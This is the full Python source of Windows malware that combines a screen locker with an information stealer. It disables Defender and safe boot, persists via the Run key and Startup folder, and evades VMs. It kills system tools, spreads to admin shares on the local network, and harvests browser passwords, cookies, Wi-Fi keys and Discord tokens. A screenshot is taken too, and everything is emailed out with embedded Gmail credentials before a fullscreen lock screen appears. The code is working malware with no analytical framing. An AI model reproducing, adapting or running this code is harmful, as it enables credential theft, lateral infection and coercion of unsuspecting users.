import ctypes, os, sys, time, threading, tempfile, tkinter as tk
from tkinter import PhotoImage
import shutil, winshell, base64, random, socket, subprocess, json
import urllib.request, urllib.parse, smtplib, email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2, numpy as np
from PIL import ImageGrab, Image, ImageDraw
import sqlite3, winreg, zipfile, win32crypt, re, wave
from win32com.client import Dispatch

PASSWORD = "1601"
MAX_ATTEMPTS = 4
SKULL_BASE64 = "YOUR_BASE64_HERE"
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp_video.mp4")
AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp_audio.mp3")
attempts_left = MAX_ATTEMPTS
keylog_data = []

def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
    except: pass

def disable_win_key():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
    except: pass

def restore_win_key():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
    except: pass

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def is_vm():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent(): return True
        output = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace').lower()
        for s in ["vbox", "vmware", "virtual", "qemu"]:
            if s in output: return True
    except: pass
    return False

def bypass_defender():
    try:
        if is_admin():
            for p in [tempfile.gettempdir(), os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')]:
                os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{p}\'" >nul 2>&1')
            os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1')
    except: pass

def block_safe_mode():
    try:
        if is_admin():
            os.system('bcdedit /deletevalue {current} safeboot >nul 2>&1')
    except: pass

def scan_network():
    try:
        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        return list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))
    except: return []

def infect_other_pcs():
    for ip in scan_network():
        try:
            shutil.copy2(__file__, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
        except: pass

def send_email(msg, subj=None):
    try:
        m = MIMEText(msg, 'plain', 'utf-8')
        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def send_file_email(fp, desc):
    try:
        if not os.path.exists(fp): return
        m = MIMEMultipart()
        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        with open(fp, 'rb') as f:
            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
            m.attach(p)
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=60)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try: shutil.copy2(cp, pp)
            except: pass
            cp = pp
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "DedSek", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
        winreg.CloseKey(k)
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        dest = os.path.join(startup, 'WindowsService.pyw')
        if cp != dest:
            try: shutil.copy2(cp, dest)
            except: pass
    except: pass

def download_video():
    try:
        if os.path.exists(VIDEO_PATH): os.remove(VIDEO_PATH)
        urllib.request.urlretrieve(VIDEO_URL, VIDEO_PATH)
    except: pass

def download_audio():
    try:
        if os.path.exists(AUDIO_PATH): os.remove(AUDIO_PATH)
        urllib.request.urlretrieve(AUDIO_URL, AUDIO_PATH)
    except: pass

def play_video():
    try:
        v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
        v.configure(bg='black'); v.overrideredirect(True)
        v.protocol("WM_DELETE_WINDOW", lambda: None); v.focus_force()
        try:
            import keyboard
            for k in ['alt+f4','alt+tab','ctrl+alt+del','win','esc','space','enter']:
                keyboard.add_hotkey(k, lambda: None, suppress=True)
        except: ctypes.windll.user32.BlockInput(True)
        lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
        ap = None
        try: ap = subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass
        cap = cv2.VideoCapture(VIDEO_PATH)
        if cap.isOpened():
            fps = cap.get(cv2.CAP_PROP_FPS)
            if fps <= 0 or fps > 60: fps = 30
            sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
            ft = 1.0/fps; lt = time.time()
            while cap.isOpened():
                ret, frame = cap.read()
                if not ret: break
                while time.time() - lt < ft: time.sleep(0.001)
                lt = time.time()
                frame = cv2.resize(frame, (sw, sh))
                img = tk.PhotoImage(data=cv2.imencode('.ppm', cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))[1].tobytes())
                lbl.config(image=img); lbl.image = img; v.update()
            cap.release()
        if ap:
            try: ap.terminate()
            except: pass
        v.destroy()
        try: keyboard.unhook_all(); ctypes.windll.user32.BlockInput(False)
        except: pass
    except:
        try: ctypes.windll.user32.BlockInput(False)
        except: pass

def draw_jester():
    img = Image.new('RGBA', (180, 230), (0,0,0,0))
    d = ImageDraw.Draw(img)
    d.ellipse([25, 55, 155, 200], fill='#f5e6d3', outline='black', width=2)
    d.ellipse([55, 95, 80, 108], fill='black'); d.ellipse([100, 95, 125, 108], fill='black')
    d.arc([55, 120, 125, 175], start=0, end=180, fill='black', width=3)
    for x in range(65, 120, 8): d.line([x, 148, x, 160], fill='black', width=2)
    d.polygon([90, 8, 45, 62, 135, 62], fill='#8B0000', outline='black', width=2)
    d.ellipse([35, 3, 50, 18], fill='white', outline='black')
    d.ellipse([130, 3, 145, 18], fill='white', outline='black')
    d.ellipse([80, 0, 100, 12], fill='white', outline='black')
    return img

def get_ssh_targets():
    targets = []
    try: targets.append(("EXTERNAL", urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode(), "External"))
    except: pass
    try: targets.append(("LOCAL", socket.gethostbyname(socket.gethostname()), "Local"))
    except: pass
    try:
        route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        for line in route.split('\n'):
            if '.' in line:
                gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
                if gw and not gw[0].startswith('0.'): targets.append(("GATEWAY", gw[0], "Router")); break
    except: pass
    for i, (name, ip, desc) in enumerate(targets):
        for port in [22, 23]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
                if s.connect_ex((ip, port)) == 0:
                    targets[i] = (name, ip, f"{desc} | {'SSH' if port==22 else 'Telnet'} OPEN!")
                s.close()
            except: pass
    return targets

def _decrypt_aes_gcm(data, key):
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(data[:12], data[12:], None)
    except: return None

def _get_master_key(lp):
    ls = os.path.join(os.path.dirname(os.path.dirname(lp)), 'Local State')
    if os.path.exists(ls):
        try:
            kb = json.load(open(ls, 'r', encoding='utf-8'))['os_crypt']['encrypted_key']
            return win32crypt.CryptUnprotectData(base64.b64decode(kb)[5:], None, None, None, 0)[1]
        except: pass
    return None

def steal_chromium(browser, paths):
    res = []
    for lp in paths:
        if not os.path.exists(lp): continue
        try:
            mk = _get_master_key(lp)
            db = os.path.join(tempfile.gettempdir(), f'{browser}_{random.randint(0,9999)}.db')
            shutil.copy2(lp, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in cur:
                try:
                    if pw[:3] == b'\x76\x31\x31' and mk:
                        pwd = _decrypt_aes_gcm(pw[3:], mk)
                        pwd = pwd.decode('utf-8','ignore') if pwd else "***"
                    else: pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                    res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n"+ "-"*40)
                except: res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: ***\n" + "-"*40)
            cur.close()
            try: os.remove(db)
            except: pass
        except: pass
    return res

def steal_wifi():
    r = []
    try:
        for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
            if 'Все профили' in line:
                p = line.split(':')[1].strip()
                if p:
                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
                    key = "НЕТ"
                    for dl in det.split('\n'):
                        if 'Содержимое ключа' in dl: key = dl.split(':')[1].strip()
                    r.append(f"WiFi: {p} | Пароль: {key}")
    except: pass
    return r

def steal_discord():
    tokens = set()
    for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb')]:
        if not os.path.exists(db): continue
        for f in os.listdir(db):
            if f.endswith('.ldb') or f.endswith('.log'):
                try: tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', open(os.path.join(db, f), 'r', errors='ignore').read()))
                except: pass
    return list(tokens)[:20]

def steal_firefox():
    res = []
    base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(base): return res
    for folder in os.listdir(base):
        pf = os.path.join(base, folder)
        lf = os.path.join(pf, 'logins.json'); kf = os.path.join(pf, 'key4.db')
        if not os.path.exists(lf) or not os.path.exists(kf): continue
        try:
            logins = json.load(open(lf, 'r', encoding='utf-8'))
            cur = sqlite3.connect(kf).cursor()
            cur.execute("SELECT a11, a102 FROM nssPrivate LIMIT 1")
            row = cur.fetchone()
            if not row or not row[1] or len(row[1]) < 24: continue
            key = row[1][:24]
            for login in logins.get('logins', []):
                host = login.get('hostname', ''); user = pwd = "ERROR"
                try:
                    enc = base64.b64decode(login['encryptedUsername'])
                    iv, ct = None, None
                    if enc[0] == 0x30:
                        off = 2 + (enc[1] & 0x7F) if enc[1] & 0x80 else 2
                        while off < len(enc):
                            tag, l = enc[off], enc[off+1]; val = enc[off+2:off+2+l]
                            if tag == 0x04:
                                if iv is None: iv = val
                                else: ct = val
                            off += 2 + l
                    if iv and ct:
                        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                        from cryptography.hazmat.backends import default_backend
                        dec = Cipher(algorithms.TripleDES(key), modes.CBC(iv), default_backend()).decryptor()
                        r = dec.update(ct) + dec.finalize()
                        r = r[:-r[-1]] if r[-1] < 16 else r
                        user = r.decode('utf-8','ignore').lstrip('\x00').strip()
                except: pass
                try:
                    enc = base64.b64decode(login['encryptedPassword'])
                    iv, ct = None, None
                    if enc[0] == 0x30:
                        off = 2 + (enc[1] & 0x7F) if enc[1] & 0x80 else 2
                        while off < len(enc):
                            tag, l = enc[off], enc[off+1]; val = enc[off+2:off+2+l]
                            if tag == 0x04:
                                if iv is None: iv = val
                                else: ct = val
                            off += 2 + l
                    if iv and ct:
                        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                        from cryptography.hazmat.backends import default_backend
                        dec = Cipher(algorithms.TripleDES(key), modes.CBC(iv), default_backend()).decryptor()
                        r = dec.update(ct) + dec.finalize()
                        r = r[:-r[-1]] if r[-1] < 16 else r
                        pwd = r.decode('utf-8','ignore').lstrip('\x00').strip()
                except: pass
                res.append(f"URL: {host}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*40)
            cur.close()
        except: pass
    return res

def steal_cookies():
    r = []
    for cp in [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')]:
        if not os.path.exists(cp): continue
        try:
            db = os.path.join(tempfile.gettempdir(), f'ck_{random.randint(0,9999)}.db')
            shutil.copy2(cp, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for host, name, enc in cur.fetchall():
                try:
                    val = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8','ignore')
                    r.append(f"{host} | {name} | {val[:100]}")
                except: pass
            cur.close(); os.remove(db)
        except: pass
    return r[:300] if r else ["No cookies"]

def mega_steal():
    targets = get_ssh_targets()
    report = ["="*60, "DEDSEK ULTIMATE STEALER", "="*60]
    report.append(f"\nUSER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
    report.append("\nSSH/TELNET TARGETS:")
    for name, ip, desc in targets: report.append(f"{name}: {ip} - {desc}")
    report.append("\nПАРОЛИ БРАУЗЕРОВ:")
    for name, paths in {"CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
                        "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
                        "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
                        "OPERA": [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')]}.items():
        data = steal_chromium(name, paths)
        if data: report.append(f"\n{name}:"); report.extend(data)
    report.append("\nFIREFOX:"); report.extend(steal_firefox() or ["No data"])
    report.append("\nWIFI:"); report.extend(steal_wifi() or ["No data"])
    cookies = steal_cookies()
    if cookies and cookies != ["No cookies"]: report.append("\nCOOKIES:"); report.extend(cookies)
    tokens = steal_discord()
    report.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["No tokens"])
    report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
    text = '\n'.join(report)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")
    try:
        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
        ImageGrab.grab().save(ss, 'JPEG', quality=50)
        send_file_email(ss, "[DedSek_Logs] Screenshot")
        try: os.remove(ss)
        except: pass
    except: pass

def block_keys():
    try:
        import keyboard
        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen']:
            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except: pass
    except: pass

def unblock():
    try: ctypes.windll.user32.BlockInput(False)
    except: pass
    try: import keyboard; keyboard.unhook_all()
    except: pass

def kill_procs():
    kl = ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe"]
    while True:
        for p in kl: os.system(f"taskkill /f /im {p} >nul 2>&1")
        time.sleep(0.05)

def reset_windows():
    try:
        restore_win_key(); unblock()
        os.system("shutdown /r /t 0 /f"); os._exit(0)
    except: os.system("shutdown /r /t 0 /f"); os._exit(0)

class WinLocker:
    def __init__(self):
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
        self.win.configure(bg='black'); self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
        global attempts_left
        
        try:
            img_data = base64.b64decode(SKULL_BASE64)
            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
            with open(img_path, "wb") as f: f.write(img_data)
            img = PhotoImage(file=img_path)
            tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.05, anchor='center')
            self.win._img = img
        except: pass
        
        try:
            jester = draw_jester()
            jp = os.path.join(tempfile.gettempdir(), "jester.png"); jester.save(jp)
            self.jp = PhotoImage(file=jp)
            tk.Label(self.win, image=self.jp, bg='black').place(relx=0.85, rely=0.12, anchor='center')
        except: pass
        
        msg = f"""Ну привет друг, как у тебя дела?

Да, понимаю, ты попался.
Ну и нахуя ты скачал игру из инета?
Я не пойму...

Ну ладно, вот тебе загадка. Там пароль.

Я — год, когда произошло событие,
которое не произошло.
В Англии заговорщики планировали
взорвать парламент и убить короля.
Их план провалился, король выжил,
а заговорщиков казнили.
Но в Windows я стал началом времён.
Потому что я — первый год,
который существует в этом мире,
но не существовал в реальности.

ЧТО Я ЗА ЧИСЛО?

У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ."""
        
        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',9,'bold'), justify='left').place(relx=0.5, rely=0.42, anchor='center')
        
        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
        self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', insertbackground='black', relief='solid', bd=2)
        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier',12,'bold'))
        self.sl.pack()
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def _keep(self):
        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            restore_win_key(); unblock()
            self.sl.config(text="ВЕРНО!", fg='white'); self.win.update(); time.sleep(1)
            self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
            else:
                self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update(); time.sleep(2)
                self.root.destroy(); reset_windows()
            self.pw.delete(0, tk.END)

if __name__ == "__main__":
    print("STARTING...")
    hide_console()
    disable_win_key()
    bypass_defender()
    add_to_startup()
    
    if is_vm():
        send_email("VM DETECTED", "Anti-VM")
        os._exit(0)
    
    block_safe_mode()
    
    threading.Thread(target=mega_steal, daemon=True).start()
    threading.Thread(target=kill_procs, daemon=True).start()
    
    time.sleep(3)
    
    try:
        download_video()
        download_audio()
        time.sleep(1)
        play_video()
    except: pass
    
    threading.Thread(target=infect_other_pcs, daemon=True).start()
    
    try: block_keys()
    except: pass
    
    print("SHOWING LOCKER...")
    WinLocker()
    tk.mainloop()
